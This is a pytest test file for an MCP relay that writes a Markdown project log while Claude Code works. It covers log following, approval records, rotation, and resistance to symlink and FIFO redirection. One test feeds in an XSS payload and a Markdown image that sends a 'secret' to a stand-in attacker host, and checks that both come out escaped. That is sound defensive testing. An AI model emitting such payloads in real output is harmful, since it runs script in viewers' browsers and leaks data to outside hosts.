"""The project's log, .relay/log.md, written as Claude Code works."""

import asyncio
import os
import shutil
import sys
from pathlib import Path

import pytest

from agent_relay_mcp import project_log
from agent_relay_mcp import relay as relay_module
from agent_relay_mcp.access import ALL
from agent_relay_mcp.config import Config
from agent_relay_mcp.control import Control
from agent_relay_mcp.project_log import ProjectLog
from agent_relay_mcp.relay import Relay

FAKE = Path(__file__).with_name("fake_claude.py")


@pytest.fixture
def setup(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.setattr(relay_module, "FOLLOW_SECONDS", 0.2)
    monkeypatch.setattr(relay_module, "SWEEP_SECONDS", 3600)
    (tmp_path / "projects/alpha").mkdir(parents=True)
    config = Config(projects_dir=tmp_path / "projects", allow_host_projects=True,
                    claude_command=f"{sys.executable} {FAKE}", state_dir=tmp_path / "state")
    asyncio.run(Relay(config).grant(ALL, include_host_projects=True, full_access_ok=True))
    return config, tmp_path / "projects/alpha"


def run(coro):
    return asyncio.run(coro)


def read(folder):
    path = folder / ".relay/log.md"
    return path.read_text() if path.exists() else ""


async def until(predicate, seconds=10):
    for _ in range(seconds * 20):
        if predicate():
            return
        await asyncio.sleep(0.05)
    raise AssertionError("never happened")


def test_the_log_follows_the_run_without_anyone_asking(setup):
    config, folder = setup

    async def scenario():
        relay = Relay(config)
        await relay.send_message("alpha", "please think, then sleep 2", False, 0)
        # No get_updates: the relay reads the output on its own.
        await until(lambda: "Looking into it." in read(folder))
        text = read(folder)
        assert "Request (new conversation, on the host)" in text
        assert "> please think, then sleep 2" in text
        assert "Pondering the request." in text and "`Bash: List files`" in text
        assert "Reply" not in text
        await until(lambda: "Reply" in read(folder))
        assert "Done: please think, then sleep 2 (new)" in read(folder)
        assert (folder / ".relay/.gitignore").read_text() == "*\n"
    run(scenario())


def test_messages_while_it_works_and_requests_are_logged(setup):
    config, folder = setup

    async def scenario():
        relay = Relay(config)
        await relay.send_message("alpha", "sleep 2", False, 0)
        await until(lambda: relay.conversations["alpha"].turn.phase == "running")
        await relay.send_message("alpha", "and also this", False, 0)
        assert "Message passed in" in read(folder) and "> and also this" in read(folder)
        await Control(relay).revoke_all()
        await relay.send_message("alpha", "locked now", False, 0)
        number = next(iter(relay.access.requests.values())).number
        assert f"Waiting for approval at the laptop (number {number})" in read(folder)
        await Control(relay).deny(next(iter(relay.access.requests)))
        assert f"Request {number} was denied" in read(folder)
    run(scenario())


def test_what_claude_code_writes_cannot_load_anything_in_a_preview(setup):
    config, folder = setup
    run(Relay(config).send_message(
        "alpha", "<img src=x onerror=alert(1)> ![t](https://evil.example/?q=secret)", False, 8))
    text = read(folder)
    assert "<img" not in text and "&lt;img" in text
    assert "![t]" not in text and "!\\[t]" in text


def test_a_restart_adds_nothing_twice(setup):
    config, folder = setup

    async def scenario():
        relay = Relay(config)
        await relay.send_message("alpha", "quick", False, 0)
        await until(lambda: relay.conversations["alpha"].turn.phase == "finished")
        restarted = Relay(config)
        await restarted.get_updates("alpha", 0)          # reads the run again
        assert read(folder).count("Done: quick (new)") == 1
    run(scenario())


def test_rotation_keeps_the_log_small(setup, tmp_path):
    _, folder = setup
    log = ProjectLog(folder, max_bytes=1000)
    log.write("x" * 2000)
    log.write(project_log.request("next", where="here", continued=True), new_request=True)
    assert (folder / ".relay/log.1.md").stat().st_size == 2000
    assert "log.1.md" in read(folder) and "> next" in read(folder)
    assert len(read(folder)) < 1000


def test_a_container_cannot_redirect_the_log(setup, tmp_path):
    _, folder = setup
    outside = tmp_path / "outside.txt"
    outside.write_text("keep\n")
    (folder / ".relay").mkdir()
    # A symlink in place of the log ...
    (folder / ".relay/log.md").symlink_to(outside)
    ProjectLog(folder).write("injected\n")
    assert outside.read_text() == "keep\n"
    # ... a FIFO (the relay must not hang) ...
    (folder / ".relay/log.md").unlink()
    os.mkfifo(folder / ".relay/log.md")
    ProjectLog(folder).write("injected\n")
    # ... or the whole folder a symlink.
    shutil.rmtree(folder / ".relay")
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (folder / ".relay").symlink_to(elsewhere)
    ProjectLog(folder).write("injected\n")
    assert list(elsewhere.iterdir()) == []


def test_the_log_can_be_turned_off(setup):
    config, folder = setup
    config.project_log = False
    run(Relay(config).send_message("alpha", "quick", False, 8))
    assert not (folder / ".relay").exists()


def test_thinking_display_is_passed_to_claude_code(setup):
    config, folder = setup
    run(Relay(config).send_message("alpha", "quick", False, 8))
    args = (folder / "fake-args.txt").read_text()
    assert '"--thinking-display", "summarized"' in args
